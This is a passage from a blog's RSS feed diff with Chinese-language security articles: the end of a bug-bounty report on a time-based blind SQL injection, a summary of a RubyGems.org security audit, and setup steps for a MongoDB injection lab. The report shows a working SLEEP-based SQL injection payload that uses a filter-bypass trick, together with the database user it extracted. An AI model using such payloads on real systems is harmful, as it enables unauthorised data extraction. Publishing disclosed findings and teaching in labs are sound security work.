+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orderby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;CASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FOR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;§h§&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;THEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ELSE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;关键技术点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用FROM/FOR替代被过滤的逗号&lt;/li&gt;
+&lt;li&gt;通过Burp Intruder自动化字符爆破&lt;/li&gt;
+&lt;li&gt;响应时间差异判断字符命中&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;漏洞验证结果&#34;&gt;漏洞验证结果
+&lt;/h2&gt;&lt;p&gt;成功获取数据库用户信息：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hema_live@10.0.102.192
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;证明该端点存在可被利用的SQL注入漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;使用参数化查询替代字符串拼接&lt;/li&gt;
+&lt;li&gt;实施严格的输入验证&lt;/li&gt;
+&lt;li&gt;建立SQL查询日志审计机制&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;2020-05-11：漏洞发现并修复&lt;/li&gt;
+&lt;li&gt;2020-05-15：HEMA确认漏洞并发放奖励&lt;/li&gt;
+&lt;li&gt;2020-08-06：报告公开披露&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>RubyGems.org安全审计报告：33个漏洞与加固建议</title>
+        <link>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</link>
+        <pubDate>Sat, 02 Aug 2025 11:53:14 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</guid>
+        <description>&lt;h1 id=&#34;ruby生态系统中央包仓库安全审计&#34;&gt;Ruby生态系统中央包仓库安全审计
+&lt;/h1&gt;&lt;p&gt;Ruby Central委托Trail of Bits对Ruby应用官方包管理系统RubyGems.org进行安全评估和竞品分析。作为下载量超1840亿次的关键基础设施，该平台的安全直接影响数百万Ruby开发者。&lt;/p&gt;
+&lt;h2 id=&#34;审计范围与发现&#34;&gt;审计范围与发现
+&lt;/h2&gt;&lt;p&gt;三名工程师耗时五周审查了rubygems.org和rubygems-terraform代码库，重点评估：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;常见Web漏洞（XSS/CSRF/SQLi/SSRF）&lt;/li&gt;
+&lt;li&gt;认证绕过风险&lt;/li&gt;
+&lt;li&gt;权限控制有效性&lt;/li&gt;
+&lt;li&gt;AWS服务配置安全&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;发现的33个安全问题中包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;高危漏洞&lt;/strong&gt;：SMTP邮件系统采用&lt;code&gt;enable_starttls_auto: true&lt;/code&gt;配置，可能被中间人攻击降级为明文传输。建议改用强制TLS的&lt;code&gt;enable_starttls&lt;/code&gt;配置。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;部署流程缺陷&lt;/strong&gt;：生产环境部署缺乏多方审批机制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;基础设施风险&lt;/strong&gt;：混合使用IaC与手动配置导致安全缺口（TOB-RGM-16等4个相关发现）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;反序列化风险&lt;/strong&gt;：RubyGems库存储Marshal数据可能被利用（虽不影响服务本身）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;竞品分析与改进建议&#34;&gt;竞品分析与改进建议
+&lt;/h2&gt;&lt;p&gt;对比PyPI/npm等包管理器后提出19项改进，重点包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;强化可信发布基础设施&lt;/li&gt;
+&lt;li&gt;扩展支持平台范围&lt;/li&gt;
+&lt;li&gt;自动化权限管理（Terraform）&lt;/li&gt;
+&lt;li&gt;集成安全测试工具链（Semgrep/Burp Suite/Ruzzy）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;自动化测试方案&#34;&gt;自动化测试方案
+&lt;/h2&gt;&lt;p&gt;采用多层次安全测试：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;静态分析&lt;/strong&gt;：定制Semgrep规则检测不安全配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;动态测试&lt;/strong&gt;：Burp Suite Professional检测SSRF/API漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;模糊测试&lt;/strong&gt;：Ruzzy模糊测试器重点检测WebAuthn的CBOR库内存损坏风险&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;ldquo;此次审计既确认了我们负责任地维护着Ruby包生态，也指明了下一步安全投资方向&amp;rdquo; —— Ruby Central安全工程师Samuel Giddins&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;完整报告详见[审计报告链接]，Ruby Central团队声明参见[公告链接]。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>NoSQL注入实验室 - 探索MongoDB安全漏洞实战</title>
+        <link>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</link>
+        <pubDate>Sat, 02 Aug 2025 10:07:12 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/nosql%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%8E%A2%E7%B4%A2mongodb%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/</guid>
+        <description>&lt;h1 id=&#34;nosqli-lab&#34;&gt;NoSQLi Lab
+&lt;/h1&gt;&lt;p&gt;随着NoSQL的流行，我决定建立一个实验室来研究针对NoSQL数据库的各种攻击技术。这就是最终的成果&amp;hellip;&lt;/p&gt;
+&lt;p&gt;由于之前已使用Redis进行过开发工作，本次实验我选择MongoDB作为研究对象。实验室构建了两种漏洞场景：一种是类似SQL注入中&amp;quot;or 1=1&amp;quot;的经典漏洞，另一种是NoSQL特有的脚本注入攻击。未来可能会添加更多场景，但当前这两个已足够开展基础研究。&lt;/p&gt;
+&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建
+&lt;/h2&gt;&lt;p&gt;安装过程非常简单，关键是要确保Linux发行版包含PHP的最新MongoDB驱动。正确的驱动是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php-mongodb - MongoDB driver for PHP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;而错误的旧版驱动是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php5-mongo - MongoDB database driver
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;实验代码托管在Github：https://github.com/digininja/nosqlilab。以下是在Debian Stretch系统上的部署步骤（注意Jessie系统使用旧版驱动无法运行）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get dist-upgrade
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install php-mongodb apache2 vim mongodb git php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /var/www/html/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm index.html 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/digininja/nosqlilab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;访问服务器IP后应看到实验室首页：&lt;/p&gt;
+&lt;h2 id=&#34;数据库初始化&#34;&gt;数据库初始化
+&lt;/h2&gt;&lt;p&gt;首先需要通过&amp;quot;Reset Database&amp;quot;链接初始化测试数据。成功时会显示&amp;quot;Database Reset Successfully&amp;quot;消息：&lt;/p&gt;
+&lt;p&gt;若出现PHP代码说明PHP未正确安装或启用；若页面渲染不完整则可能是MongoDB库缺失，可检查Apache错误日志或通过phpinfo()页面验证驱动是否加载正确。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞场景&#34;&gt;漏洞场景
+&lt;/h2&gt;&lt;p&gt;实验包含两个存在漏洞的页面：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&amp;ldquo;Guess The Key&amp;rdquo; - 经典注入漏洞&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;User Lookup&amp;rdquo; - NoSQL特有攻击场景&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;具体攻击方法可参考OWASP的《NoSQL注入测试指南》，实验代码中也提供了隐藏的解决方案示例。&lt;/p&gt;
+&lt;h2 id=&#34;问题反馈&#34;&gt;问题反馈
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;提示：所有实验内容由Robin Wood创建，除非另有说明。项目采用非商业性质，可通过affiliate链接支持作者。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
         <title>RFID近场克隆攻击技术深度解析</title>
         <link>http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
         <pubDate>Sat, 02 Aug 2025 09:07:14 +0800</pubDate>
